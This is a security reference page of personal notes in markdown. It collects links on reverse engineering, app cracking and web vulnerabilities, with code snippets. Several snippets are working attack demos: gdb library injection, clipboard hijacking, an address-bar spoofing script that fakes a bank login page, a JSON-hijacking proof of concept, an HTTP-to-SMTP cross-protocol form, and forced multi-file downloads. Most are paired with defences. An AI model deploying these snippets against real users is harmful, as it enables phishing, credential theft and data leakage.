
#### Recover compromised server

- [hacking - How do I deal with a compromised server? - Server Fault](http://serverfault.com/questions/218005/how-do-i-deal-with-a-compromised-server)
- [Steps for Recovering from a UNIX or NT System Compromise](http://www.cert.org/historical/tech_tips/win-UNIX-system_compromise.cfm)

### Hacking

See [Prevent violation](#prevent-violation)

```sh
# mach injection hack
# From https://github.com/mschrag/slowmo
cat <<EOM | gdb -quiet > /dev/null
attach $SIM_PID
p (void *)dlopen("$(cd "$(dirname "$0")"; pwd)/mach.bin", 2)
detach
EOM
# Then start targeted app
```

```sh
sudo fs_usage -w -f filesys | grep "file_used.ext"
```

- [Cracking Sublime Text 3](http://blog.fernandodominguez.me/cracking-sublime-text-3/)
- [A collection of resources for linux reverse engineering](https://github.com/michalmalik/linux-re-101)
- [How to Crack Just About Any Mac App (and How to Prevent It)](http://lifehacker.com/5736101/how-to-crack-just-about-any-mac-app-and-how-to-prevent-it)
- [Hopper](https://www.hopperapp.com/)
- [Ghidra](https://ghidra-sre.org/) - [Ghidra.app launcher for OSX](https://gist.github.com/yifanlu/e9965cdb148b550335e57899f790cad2)
- [Mobile Security Wiki](https://mobilesecuritywiki.com/) - see https://github.com/exploitprotocol/mobile-security-wiki
- [Reverse engineering](http://en.wikipedia.org/wiki/Reverse_engineering)
- [Programming Linux Anti-Reversing Techniques by Jacob Baines \[PDF/iPad/Kindle\]](https://leanpub.com/anti-reverse-engineering-linux) (see [the PDF](anti-reverse-engineering-linux.pdf)) https://github.com/antire-book/dont_panic
- [IDA](https://www.hex-rays.com/products/ida/)
- [Linux_Anti_Debug.pdf](Linux_Anti_Debug.pdf)
- [Eldad_Eilam-Reversing__Secrets_of_Reverse_Engineering-Wiley(2005).pdf](Eldad_Eilam-Reversing__Secrets_of_Reverse_Engineering-Wiley(2005).pdf)
- [anti-reverse-engineering-linux.pdf](anti-reverse-engineering-linux.pdf)
- [How to Reverse Engineer OS X and iOS Software](https://davidwalsh.name/reverse-engineer-os-ios-software)
- [OS X and iOS Reverse Engineering: How to Reverse Engineer an iOS App](https://www.apriorit.com/dev-blog/363-how-to-reverse-engineer-os-x-and-ios-software)
- [Software Reverse Engineering Tools](https://www.apriorit.com/dev-blog/366-software-reverse-engineering-tools)
- [Reverse-engineering Instagram to access the private API](http://blog.will3942.com/reverse-engineering-instagram) - By modify Instagram Android App APK
- [REC Decompiler Home Page](http://www.backerstreet.com/rec/rec.htm) - Tool to reverse compilation. Recognises "signature" assembly code that compilers generate for program structures such as conditionals (if, else, switch) and loops (for, do, while) and generates C like code
- [Reverse Engineering Linux x86 Binaries](http://althing.cs.dartmouth.edu/local/reverse-talk.pdf)
- [Frida • A world-class dynamic instrumentation framework - Inject JavaScript to explore native apps on Windows, macOS, Linux, iOS, Android, and QNX](https://www.frida.re/) - See [Frida, la nouvelle amie des reversers et hackers - virtualabs.fr](http://www.virtualabs.fr/Frida-la-nouvelle-amie-des)
- [Reversing d’applications Android - virtualabs.fr](http://www.virtualabs.fr/Reversing-d-applications-Android)
- [How to recover lost Python source code if it's still resident in-memory](https://gist.github.com/simonw/8aa492e59265c1a021f5c5618f9e6b12)
- [SpiderMonkey | Didier Stevens](https://blog.didierstevens.com/programs/spidermonkey/) - Use a modified ECMAScript engine to desofuscate code
- [Digital Whisper :: עמוד הגליונות](http://www.digitalwhisper.co.il/Issues/) - Resource in Hebrew, but with code chunks and captures
- anti-debugger protection - [Anti Reverse Engineering Protection Techniques to Use Before Releasing Software](https://www.apriorit.com/dev-blog/367-anti-reverse-engineering-protection-techniques-to-use-before-releasing-software)
- ECMAScript: Object in can be used as scalar values (called [primite values](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures#Primitive_values)) via the [`Object#valueOf()` method](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/valueOf): `let randomNumber = {valueOf(){return Math.random(), toString(){return Math.random()}}}; randomNumber + 1;// 1.3751036170372646 <- random value`. See also [`Symbol.toPrimitive`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/toPrimitive): `let randomNumber = {[Symbol.toPrimitive](hint){return Math.random()}}`
- [Hooked on Mnemonics Worked for Me: A Primer on Cracking XOR Encoded Executables](http://hooked-on-mnemonics.blogspot.fr/2017/04/a-primer-on-cracking-xor-encoded.html)
- [FlexiSpy hack](https://pastebin.com/raw/Y1yf8kq0)
- [RE guide for beginners: Methodology and tools - Reverse Engineering - 0x00sec](https://0x00sec.org/t/re-guide-for-beginners-methodology-and-tools/2242)
- [Exploring OS X Preview Signatures – mikeymikey blogs here](http://michaellynn.github.io/2015/07/26/exploring-os-x-preview-signatures/) - Decode data from macOS Preview Signatures
- [class-dump - Steve Nygard](http://stevenygard.com/projects/class-dump/) - Generates declarations for the classes, categories and protocols from Objective-C runtime information stored in Mach-O files
- [w0lfschild/macOS_headers: A consistently maintained dump of most macOS Headers](https://github.com/w0lfschild/macOS_headers)
- [RE for Beginners | Reverse Engineering](https://www.begin.re/)
- [Reverse Engineering Stickies.app - Low Level Bits](https://lowlevelbits.org/reverse-engineering-stickies.app/)
- [Nightmare - Nightmare](https://guyinatuxedo.github.io/) - "Nightmare is an intro to binary exploitation / reverse engineering course based around ctf challenges."

#### Alternative data storage

See also [Steganography](#steganography)

Use (abuse) special cases where the data storage have different (better) quota limitation:

- Google Docs take up 0 bytes of quota in your Google Drive
- 1 TB of free storage for Flickr users (images only)
- Amazon Drive: the Prime Photos plan offers unlimited storage for photos and RAW files
- Google Docs store complete history version of the document (keystrokes?)
- YouTube imposes no limits on the total number or length of videos users can upload, pixels of each frames to store data
- URL shorteners
- Gmail allow in 2006 a large amount of storage for email attachments
- Usenet store data files
- create multi accounts

Inject data ZIP at the end of a valid image, for platform that don't reencode/destroy appended data to images (ex: GIF)

- [How to Use Your New Terabyte of Free Flickr Storage for More Than Just Photos Using This Hack « Digiwonk :: Gadget Hacks](https://digiwonk.gadgethacks.com/how-to/use-your-new-terabyte-free-flickr-storage-for-more-than-just-photos-using-hack-0147022/)
- [At the risk of "ruining" it for some users, Amazon doesn't appear to validate no... | Hacker News](https://news.ycombinator.com/item?id=13998534)
- [GmailFS - Gmail Filesystem](https://web.archive.org/web/20060424165737/http://richard.jones.name/google-hacks/gmail-filesystem/gmail-filesystem.html)
- [dzhang314/YouTubeDrive: Store files as YouTube videos == infinite disk space](https://github.com/dzhang314/YouTubeDrive)
- [stewartmcgown/uds: Unlimited Drive Storage by splitting binary files into base64](https://github.com/stewartmcgown/uds)
- [tuxxy/BandcampFS: BandcampFS is a proof of concept that allows people to backup files to bandcamp.com via WAV files.](https://github.com/tuxxy/BandcampFS)
- [hansendc/gmailfs: FUSE-based filesystem for using an IMAP server (like gmail) as normal storage like a hard disk.](https://github.com/hansendc/gmailfs)
- [NZB — Wikipedia](https://en.wikipedia.org/wiki/NZB)
- [Usenet — Wikipedia](https://en.wikipedia.org/wiki/Usenet#Binary_content)
- [DNSFS. Store your files in others DNS resolver caches](https://blog.benjojo.co.uk/post/dns-filesystem-true-cloud-storage-dnsfs) - [DNSFS – Store files in others' DNS resolver caches | Hacker News](https://news.ycombinator.com/item?id=16134041)
- [WarrenGreen/InfiniteDrop: Distributed FileSystem across Dropbox accounts](https://github.com/WarrenGreen/InfiniteDrop)

### Vulnerabilities

See [Know your weaknesses](#know-your-weaknesses)

- Fake hotspot: [Wifi ouvert - Attention aux faux hotspot ! (+ une démo avec un module Arduino) - Korben](http://korben.info/wifi-ouvert-attention-aux-faux-hotspot-demo-module-arduino.html?utm_source=dlvr.it&utm_medium=twitter)
- [Malware in the browser: how you might get hacked by a Chrome extension](https://kjaer.io/extension-malware/)
- [Real Future: What Happens When You Dare Expert Hackers To Hack You (Episode 8) - YouTube](https://www.youtube.com/watch?v=bjYhmX_OUQQ)
- [Crooks can guess Visa card details in six seconds by querying lots of websites at once / Boing Boing](https://boingboing.net/2016/12/04/crooks-can-guess-visa-card-det.html)
- [Category:Computer security stubs — Wikipedia](https://en.wikipedia.org/wiki/Category:Computer_security_stubs)
- [Category:Computer security exploits — Wikipedia](https://en.wikipedia.org/wiki/Category:Computer_security_exploits)
- [Category:Web security exploits — Wikipedia](https://en.wikipedia.org/wiki/Category:Web_security_exploits)
- [Category:Algorithmic complexity attacks — Wikipedia](https://en.wikipedia.org/wiki/Category:Algorithmic_complexity_attacks)
- [Deadlock — Wikipedia](https://en.wikipedia.org/wiki/Deadlock)
- [CWE - 2011 CWE/SANS Top 25 Most Dangerous Software Errors](https://cwe.mitre.org/top25/index.html#Listing)
- [OWASP Top Ten Cheat Sheet - OWASP](https://www.owasp.org/index.php/OWASP_Top_Ten_Cheat_Sheet)
- [Category:OWASP Top Ten Project - OWASP](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project)
- [Detecting the use of "curl | bash" server side | Application Security](https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/)
- [Category:Vulnerability - OWASP](https://www.owasp.org/index.php/Category:Vulnerability)
- [Minded Security Blog: Ye Olde Crockford JSON regexp is Bypassable](http://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html)
- [Hacking Printers](http://hacking-printers.net/wiki/index.php/Main_Page) [Printer Exploitation Toolkit](https://github.com/RUB-NDS/PRET)
- Fixes for previous version don't be protected against new language possibilities [ECMAScript 6 from an Attacker's Perspective - Breaking Frameworks, Sa…](http://www.slideshare.net/x00mario/es6-en)
- Graphics Interchange Format Java Archives (GIFAR) malware [Gifar - Wikipedia, the free encyclopedia](https://en.wikipedia.org/wiki/Gifar)
- [A Chip Flaw Strips Away a Key Hacking Safeguard for Millions of Devices | WIRED](https://www.wired.com/2017/02/flaw-millions-chips-strips-away-key-hacking-defense-software-cant-fully-fix/amp/) - See [AnC - VUSec](https://www.vusec.net/projects/anc/)
- [Web Security Research» Alex's Corner: HTTP Range & Request-Range Request Headers](http://kuza55.blogspot.fr/2008/02/http-range-request-range-request.html) - Flash block scripts that write HTTP header `Range`, but not `Request-Range` (blocked starting Flash 9.0.115). Apache support both. See [Troubleshoot ActionScript error in Flash Player](https://helpx.adobe.com/flash-player/kb/actionscript-error-send-action-contains.html)
- [lame hackers guide: Weaponizing PostScript](https://lamehackersguide.blogspot.fr/2017/02/weaponizing-postscript.html) - PostScript vulnerability: open files
- [ServiceWorker is dangerous](https://alf.nu/ServiceWorker) - ServiceWorker on subdomain with pages contains user's scripts
- [HTTP Parameter Pollution with cookies in PHP | Application Security](https://www.idontplaydarts.com/2013/06/http-parameter-pollution-with-cookies-in-php/) - Coookie pollution using rogue cookie: `session_id=123` = `session_id%00blah==123`
- [Hostile Subdomain Takeover using Heroku/Github/Desk + more](https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/) - hacked via DNS subdomain takeover via DNS entries for a domain people aren’t aware of.
- [Broken Browser – Fun with Browser Vulnerabilities](http://www.brokenbrowser.com/)
- [Exploits Database by Offensive Security](https://www.exploit-db.com/)

Fuzzing test

About fuzzing test with JPEG data:

> It starts with an invalid .jpg (literally a text file containing "hello"), and by trying over and over, changing random bytes and tracing the execution of the decoder program as it is fed the corrupted input, it will drill deeper and deeper into the program until it has gotten far enough that the input is actually a valid .jpg, without any human input.
> 
> Fuzzing like this is a very effective technique for finding (security) bugs in programs that parse input, because you will quickly end up with "impossible" input nobody thought to check for (but is close enough that it won't be rejected outright), and whoops there's your buffer overflow.
> [...]
> it just finds one input that makes the program exit with exit code zero (for success)
— [Pulling JPEGs out of thin air | Hacker News](https://news.ycombinator.com/item?id=8571879)

- [Fuzzing — Wikipedia](https://en.wikipedia.org/wiki/Fuzzing)
- [lcamtuf's blog: Pulling JPEGs out of thin air](https://lcamtuf.blogspot.fr/2014/11/pulling-jpegs-out-of-thin-air.html) - Use genetic algorithm to generate data that test vulneratilities. See [american fuzzy lop](http://lcamtuf.coredump.cx/afl/)

Four General Attack-Vectors:

- A1: Attacking the Sandbox
- A2: Attacking the Sanitizer
- A3: Attacking the CSP Mode
- A4: Attacking the Codebase

#### Libraries

Front end, back end. Third party or internal. **Update it as soon as possible.**

- [Thou shalt not depend on me: analysing the use of outdated JavaScript libraries on the web | the morning paper](https://blog.acolyer.org/2017/03/07/thou-shalt-not-depend-on-me-analysing-the-use-of-outdated-javascript-libraries-on-the-web/)

#### Spoofed UI

Look like phishing / spoofing trusted UI

- [The Line of Death – text/plain](https://textslashplain.com/2017/01/14/the-line-of-death/)
- fullscreen document (can display a fake OS / browser UI)
- [Beware! Don't Fall For "Font Wasn't Found" Google Chrome Malware Scam](http://thehackernews.com/2017/02/HoeflerText-font-chrome.html)
- [Clickjacking](#clickjacking)
- [Tabnabbing and Address Bar Spoofing](#tabnabbing-and-address-bar-spoofing)
- [Pastejacking](#pastejacking)
- [Fake History](#fake-history)
- [Email spoofing — Wikipedia](https://en.wikipedia.org/wiki/Email_spoofing)
- [Phishing — Wikipedia](https://en.wikipedia.org/wiki/Phishing)
- [The Attack of the Alerts and the Zombie Script – Broken Browser](https://www.brokenbrowser.com/zombie-alert/)

#### DOM clobbering

**Don't name your inputs or buttons `submit`, `action`, `method`, `style`, `dataset`, `id`, `attributes`, `children`, etc.**

```html
<form id="form" action="somewhere" method="post">
	<input type="text" name="action" value="pay">
	<input type="text" name="method" value="credit-card">
	<input type="text" name="attributes" value="something">
	<button name="submit">Send</button>
<form>
<script>
	let form = document.getElementById("form");
	form === window.form
	form.action// HTMLInputElement instead of String "somewhere"
	form.method// HTMLInputElement instead of String "post"
	form.submit// HTMLButtonElement instead of Function
	form.attributes// HTMLInputElement instead of NamedNodeMap
</script>

<div id="myId"></div>
<script>
myId                            // [object HTMLDivElement]
myId.id                         // "myId"
window.myId.id                  // "myId"
this.myId.id                    // "myId"
self.myId.id                    // "myId"
top.myId.id                     // "myId"
"myId" in window                // true
window.hasOwnProperty("myId")   // true
</script>
```

An implicit id can't have the same name as a protected JS keyword and can't overload a native global var, such as `window.screen`:

```html
<div id="function"></div>
<script>console.log(function) // SyntaxError: Unexpected token</script>
```

```html
<p id="alert">Some message</p>
<script>console.log(alert)// ƒ alert() { [native code] }</script>
```

- [Named access on the Window object - HTML Standard](https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object)
- [DOM clobbering](http://www.thespanner.co.uk/2013/05/16/dom-clobbering/)
- [In the DOM, no one will hear you scream](https://www.slideshare.net/x00mario/in-the-dom-no-one-will-hear-you-scream)
- [cure53/DOMPurify: DOMPurify - a DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML and SVG. DOMPurify works with a secure default, but offers a lot of configurability and hooks. Demo:](https://github.com/cure53/DOMPurify)
- [DOMLint - Test suite against HTML/DOM conflicts](https://kangax.github.io/domlint/)
- [Microsoft/JSanity: A secure-by-default, performance, cross-browser client-side HTML sanitization library](https://github.com/Microsoft/JSanity)
- [JavaScript variable names you shouldn’t use - NCZOnline](https://www.nczonline.net/blog/2007/06/03/javascript-variable-names-you-shouldn-t-use/)
- [Unsafe Names for HTML Form Controls](http://www.jibbering.com/faq/names/)
- [Implicit getElementById's](https://xem.github.io/articles/getelementbyid.html)
- [Clobbering the clobbered — Advanced DOM Clobbering - terjanq - Medium](https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94)
- [JSLR](http://www.thespanner.co.uk/2012/06/05/jslr/)

#### Clickjacking

```js
if (self !== top) {
	document.body.style.display = "none";
	top.location = self.location;
}
```

Use header `Content-Security-Policy: frame-ancestors 'self'` (or the depreciated `X-Frame-Options: SAMEORIGIN`)

- [CSP Policy Directives - Web security | MDN](https://developer.mozilla.org/en-US/docs/Web/Security/CSP/CSP_policy_directives#frame-ancestors)
- [X-Frame-Options - HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)
- [Clickjacking Defense Cheat Sheet - OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet)
- [Custom animated cursor via canvas / Stoyan's phpied.com](http://www.phpied.com/custom-animated-cursor-via-canvas/) can be used for clickjacking the browser UI (see https://jameshfisher.github.io/cursory-hack/)

#### Pastejacking

After a copy action:

```html
<pre>echo "not evil"</pre>
<script>
// Hijack copied data and put an evil command
document.addEventListener("copy", event => {
	console.log(event);
	event.clipboardData.setData("text/plain", "echo \"evil\"\r\n");
	event.preventDefault(); // We want our data, not data from any selection, to be written to the clipboard
});
</script>
```

After other action (with or without timeframe): keydown, (inputs) change, click, dblclick, mouseup, (inputs) reset, (form) submit
Even if the timeframe is not supported, you can add delay after the action by using infinite loop over a short periode of time: the user use keyboard to copy (Crtl+C/Cmd+C) wait 800ms (limited by the maximum execution time limit for long-running scripts) and overwrite the copied value

- [A demo of overriding what's in a person's clipboard](https://github.com/dxa4481/Pastejacking)
- "Event handlers that are allowed to modify the clipboard" [Clipboard API and events](https://www.w3.org/TR/clipboard-apis/#event-handlers-that-are-allowed-to-modify-the-clipboard)
- "algorithm is allowed to show a popup" [5 Loading Web pages — HTML5](https://www.w3.org/TR/html5/browsers.html#allowed-to-show-a-popup)
- [Document.execCommand() - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/Document/execCommand#Browser_compatibility)
- [copy - Event reference | MDN](https://developer.mozilla.org/en-US/docs/Web/Events/copy)
- [clipboardData object (Internet Explorer)](https://msdn.microsoft.com/en-us/library/ms535220%28v=vs.85%29.aspx) https://developer.microsoft.com/en-us/microsoft-edge/platform/status/clipboardapi/ https://connect.microsoft.com/IE/feedback/details/1572456/edge-clipboard-api-text-html-content-messed-up-in-event-clipboarddata

#### Tabnabbing and Address Bar Spoofing

Link and `target="_blank"` or `window.open()`

```html
<a href="http://host/maliciousepage.html" target="_blank">My profile on an other network</a>
```

It's a security issue if the link is provided by user or if the original link has been hacked/squatted (owner change), in the target document `window.opener` is accessible and can change it `location`.

Use [`rel="noreferrer"`](https://html.spec.whatwg.org/multipage/semantics.html#link-type-noopener) (`window.opener` - opener browsing context - will be nulled) or use a redirect mechanism (http://host/redirect?signature=XXXXXX&url=XXXX) will set `window.opener` to null then redirect:

```http
HTTP/1.0 200 OK
<head><noscript><meta http-equiv="refresh" content="0;URL='__final_url__'"></noscript><title>__final_url__</title></head><script>window.opener=null;location.replace("__final_url__")</script>
```

Or use JavaScript:

```js
let target = window.open("about:blank"/*other params*/);
target.document.write(`<script>window.opener=null;location.replace("${url}")</script>`);
// data URI can't be used here because of IE. You can use blob URI, but it's not pratical because we need to revoke the object URL once the popup is loaded
```

- [Tabnabbing attack on Facebook](https://gist.github.com/mems/df881c9495b6744b650c)
- [Tabnabbing — Wikipedia](https://en.wikipedia.org/wiki/Tabnabbing)
- [Phishing by navigating browser tabs - Bughunter University](https://sites.google.com/site/bughunteruniversity/nonvuln/phishing-with-window-opener)
- [About rel=noopener](https://mathiasbynens.github.io/rel-noopener/)
- [Window.opener - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/Window/opener)
- [Issue 156712 - chromium - html anchors set window.opener (spoofing/phishing threat) - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=156712)
- [Links to Unrelated Browsing Contexts - WHATWG Wiki](https://wiki.whatwg.org/wiki/Links_to_Unrelated_Browsing_Contexts)
- [Target="_blank" is an underestimated vulnerability | Hacker News](https://news.ycombinator.com/item?id=11631292)
- [Login-stealing phishing sites conceal their evil with lots of hyphens in URL | Ars Technica](https://arstechnica.com/security/2017/06/phishing-attacks-target-mobile-browsers-with-dash-padded-urls/)

Opener attack opened (inverse technique):

```html
<script>
/*
If you don't get it, banking.beaver-peak.us is a trusted banking website;
everything else is attacker-controlled. We begin by opening the legitimate
banking website, and giving the user enough time to examine the address bar.

There is a common misconception that changing the URL must result in a visible
page transition that alerts the user to foul play, but that's not the case.

PS. In older versions of Firefox, where the http:// prefix is not hidden,
this will look a bit less convincing due to the misalignment of URLs. Easy to
fix, but upgrade your browser already.

PPS. Bonus question: can you do something useful by flipping two pages
very rapidly, especially with history.*? What are the implications for
clickjacking & friends?
*/
var spaces = 
  "                                                                          " +
  "                                                                          " +
  "                                                                          " +
  "                                                                          " +
  "                                                                          " +
  "                                                                          " +
  "                                                                          " +
  "                                                                          ";
var bank_html =
  '<title>Beaver Peak Banking and BBQ</title>' +
  '<img src="http://banking.beaver-peak.us/banking_interface/beaver-peak.jpg" style="float: left; margin-right: 10px">' +
  '<font size=+3 color=steelblue><b>Beaver Peak Banking and BBQ</b></font><br>' +
  '<i>"Best steaks in town!"</i> -- Creek and Brook Daily<br clear="all"><p> ' +
  '<font color=crimson>Security tip: confirm that <i>http://banking.beaver-peak.us/</i> is present in the address bar!</font>' +
  '<p><b>Please login to our secure banking system:</b><p><table><tr><td>Login:</td><td><input type=text></td></tr><tr>' +
  '<td>Password:</td><td><input type=password></td></tr></table><p><input type=submit value="Log in!">' +
  '<p><div style="border-width: 1px 0 0 0;border-color:steelblue; border-style:solid">' +
  '<font color=gray size=-1>Member FDIC. FDA certified. Truck parking available.</font></div>';

var originalURL = 'http://banking.beaver-peak.us/banking_interface/';
var fakeURL = 'http://banking.coredump.cx/us/banking_interface/';
function dostuff() {
  /* Precache */
  if (navigator.userAgent.indexOf('; MSIE') != -1) {
    var x = new Image();
    x.src = fakeURL;
  }
  w = window.open(originalURL, 'target');
  setTimeout(dostuff2, 7500);
}

function dostuff2() {
  if (navigator.userAgent.indexOf('; MSIE') != -1)
    w.open(fakeURL,'target');
  else if (navigator.userAgent.indexOf('Opera/') != -1)
    w.location.replace('data:text/html;charset=UTF-8,.beaver-peak.us/banking_interface/' + spaces + ',' + escape(bank_html));
  else
    w.location.replace('data:text/html;charset=UTF-8,-peak.us/banking_interface/' + spaces + ',' + escape(bank_html));
}
</script>
<p>illustrates the effectiveness of using
data: or precached content to do the deed. Should work neatly in
up-to-date browsers. You're probably fooling yourself if you 
think you'd reliably spot this happening to you in the wild.</p>
<a href="http://banking.beaver-peak.us/banking_interface/" onclick="dostuff()">Beaver peak bank</a>
```

- [lcamtuf's blog: The old switcharoo](http://lcamtuf.blogspot.fr/2011/12/old-switcharoo.html)
- [The old seamless switcharoo](http://lcamtuf.coredump.cx/switch/)
- [You sniff MIME / assume HTML on what?](http://lcamtuf.coredump.cx/switch/index2.html)
- [lcamtuf's blog: Yes, you can have fun with downloads](http://lcamtuf.blogspot.fr/2012/05/yes-you-can-have-fun-with-downloads.html)
- [Fake download](http://lcamtuf.coredump.cx/fldl/)
- [Download demo](http://hallvord.com/temp/moz/dl.htm)
- [Google Chrome, Firefox Address Bar Spoofing Vulnerability - Miscellaneous Ramblings of A Hacker](http://www.rafayhackingarticles.net/2016/08/google-chrome-firefox-address-bar.html)
- [Sebastian Kaspari on Twitter: "The URL in @FennecNightly is now scrollable and will be scrolled to the "base domain" by default. CC @gcpascutto (Thanks @buttercookie42) https://t.co/KRhDqfOLpo"](https://twitter.com/Anti_Hype/status/907948793047416832)

Use Multipart replace resource:

- [Page Loading: multipart test 1: Kitchen](https://hixie.ch/tests/evil/page-loading/multipart/001.cgi)
- [Page load processing model for `multipart/x-mixed-replace` resources](https://www.w3.org/TR/html5/single-page.html#read-multipart-x-mixed-replace)

Interrupt navigation and rewrite content of the document

```js
// Navigate to other document... then:
window.onunload = function()
{
	document.execCommand("stop");
	setTimeout('document.write("Spoofed URL on Edge");document.close();');
}
```

- [Microsoft Edge - AddressBar Spoof](http://www.cracking.com.ar/demos/edgespoof/2/)
- https://mobile.twitter.com/magicmac2000/status/779339530872692737

#### DNS rebinding

- [DNS rebinding — Wikipedia](https://en.wikipedia.org/wiki/DNS_rebinding)

#### Fake History

- [Stealing the users back button with the History API – Ryan Seddon](https://www.thecssninja.com/javascript/stealing-history-api)

#### HTTP/0.9 vulnerability

Response without HTTP overhead "HTTP/1.0 200 OK" nor any header, just the content

Allow potential XSS attacks to ASCII protocols (like SMTP, NNTP, POP3, IRC, etc.) via POST requests

```html
<form method="post" action="http://mail.example.org:25/">
	<textarea>
HELO example.com
MAIL FROM:<somebody@example.com>
RCPT TO:<recipient@example.org>
DATA
Subject: Hi there!
From: somebody@example.com
To: recipient@example.org
Hello world!
.
QUIT
	</textarea>
</form>
<!--
The result will be:
220 mail.example.org ESMTP Hi there!
500 Command unrecognized
[...]
500 Command unrecognized
250 mail.example.org Hello example.com [10.11.12.13]
250 <somebody@example.com> is syntactically correct
250 <recipient@example.org> is syntactically correct
354 Enter message, ending with "." on a line by itself
250 OK id=15IYAS-00073G-00
221 mail.example.org closing connection
-->
```

- [Issue 624462 - chromium - Reduce cases where HTTP/0.9 is supported - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=624462)
- [Issue 600352 - chromium - Security: Cross-Protocol Theft from non-HTTP services via DNS rebinding + HTTP/0.9 - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=600352)
- https://bugzilla.mozilla.org/show_bug.cgi?id=1262128
- [The HTML Form Protocol Attack — Jochen Topf](https://www.jochentopf.com/hfpa/hfpa.pdf) https://www.jochentopf.com/hfpa/

#### Backdoors

**It's a breach of your security system. Anyone can found and use it.**

- https://github.com/Xyl2k/TSA-Travel-Sentry-master-keys
- [Travel Sentry - Wikipedia, the free encyclopedia](https://en.wikipedia.org/wiki/Travel_Sentry#Master_Key_Compromise)
- [Transportation Security Administration - Wikipedia, the free encyclopedia](https://en.wikipedia.org/wiki/Transportation_Security_Administration#Luggage_locks)

#### Time sync issue

If NTP is spoofed

> Changing time on devices is more an annoyance than anything, and doesn't necessarily get you into a device.

How about you set the time on your server ahead by 5 years:

- Most of your passwords would expire
- All your SSL certs would expire
- All your TOTPs, like Google Authenticator would fail
- All your IPSEC tunnels would drop, and refuse to restart
- Many of your cron jobs would got nuts, possibly deleting all your logs
- Much of your DNSSEC would expire
- Many of your backups would be deleted since they 'expired'

Fack: setting your iPhone to 1 Jan 1970 would brick it. Fixed in iOS 9.3

- [Why 1/1/1970 Bricks Your iPhone - YouTube](https://www.youtube.com/watch?v=MVI87HzfskQ)

- [NTP server misuse and abuse — Wikipedia](https://en.wikipedia.org/wiki/NTP_server_misuse_and_abuse)
- [network - Is NTP vulnerable to DNS poisoning or spoofing attacks? - Information Security Stack Exchange](http://security.stackexchange.com/questions/4981/is-ntp-vulnerable-to-dns-poisoning-or-spoofing-attacks)

#### Cross site JSON access

GET request return JSON response as array `["foor", 2, "bar", "baz"]`, a third party document could access it, despit CS protections:

How it's works: rewrite Array constructor, which will be called by the engine when the json is parsed as JavaScript

> If the JSON starts directly with curly braces, it gets intepreted as a code block, rather than an object initializer, and nothing happens.

Require:

- JavaScript enabled / not blocked
- an old browser engine < ECMAScript 5
- the server don't send the header `X-Content-Type-Options: nosniff` or the browser don't support it
- the server don't block the client access (using the header `Origins`, access token, etc.)

`Access-Control-Allow-Origin` don't do any thing here

POC:

```html
<!-- Note: This issue has been fixed -->
<script>
var secretInfos;
var arrayOrg = Array;// redefine Array constructor
Array = function() {
	secretInfos = this;
};
</script>
<script src="http://haacked.com/demos/secret-info.json"></script>
<script>
Array = arrayOrg;// restore Array constructor
secretInfos = Array.prototype.slice.call(secretInfos);
console.log(secretInfos);
</script>
```

- [Redefining the Array constructor in javascript - Stack Overflow](https://stackoverflow.com/questions/15385588/redefining-the-array-constructor-in-javascript)
- [Jeremiah Grossman: Advanced Web Attack Techniques using GMail](http://blog.jeremiahgrossman.com/2006/01/advanced-web-attack-techniques-using.html)
- [Anatomy of a Subtle JSON Vulnerability - You’ve Been Haacked](http://haacked.com/archive/2008/11/20/anatomy-of-a-subtle-json-vulnerability.aspx/)
- [JSON is not as safe as people think it is - Incompleteness](http://incompleteness.me/blog/2007/03/05/json-is-not-as-safe-as-people-think-it-is/)
- [robubu : Safe JSON](http://robubu.com/?p=24)
- [hackademix.net » You Don't Know What My Twitter Leaks](https://hackademix.net/2009/01/13/you-dont-know-what-my-twitter-leaks/)
- [JSON Hijacking - You’ve Been Haacked](http://haacked.com/archive/2009/06/25/json-hijacking.aspx/)

#### Carpet-bombing

Can be done with iframes

```html
<iframe src="filetodownload1.exe"></iframe>
<iframe src="filetodownload2.exe"></iframe>
<iframe src="filetodownload3.exe"></iframe>
```

or with JS

```js
var dl_link = document.createElement('a');
document.body.appendChild(dl_link);
dl_link.setAttribute('href', "data:,Hello%2C%20World!");
for(let i = 1; i <= 5; i++){
	dl_link.setAttribute('download', 'test_'+i+'.txt');
	dl_link.dispatchEvent(new MouseEvent("click"));// dl_link.click()
}
```

- [Google Chrome vulnerable to carpet-bombing flaw | ZDNet](http://www.zdnet.com/article/google-chrome-vulnerable-to-carpet-bombing-flaw/)
- [127522 - Security: Chrome Allows "Carpet Bomb" from File Download - chromium - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=127522)
- [Carpet bombing — Wikipedia](https://en.wikipedia.org/wiki/Carpet_bombing)
- [Chrome Free Coupwns](http://raffon.net/research/google/chrome/carpet.html)
- [Microsoft Security Advisory 953818](https://technet.microsoft.com/en-us//library/security/953818)

#### Multipart replace resource

- [Page Loading: multipart test 1: Kitchen](https://hixie.ch/tests/evil/page-loading/multipart/001.cgi)

#### SQL injection

- [Rails SQL Injection Examples](http://rails-sqli.org/)

#### Wordpress

On common attack use upload mecanism (provided by thridpart plugins) to execute PHP scripts

`/upload/.htaccess`:

```apache
<Files *.php>
Deny from all
</Files>
```

Or DDoS by using pingbacks or xmlrpc. Disable it or whitelisted IPs in `.htaccess`

- [Attacking WordPress | HackerTarget.com](https://hackertarget.com/attacking-wordpress/)

#### HTML/SVG/XML vulnerabilities

The same for HTML files. See also `innerHTML`

All browsers/libs don't handle the same way this files

- [XSS and injection vulnerabilities](#xss-and-injection-vulnerabilities)
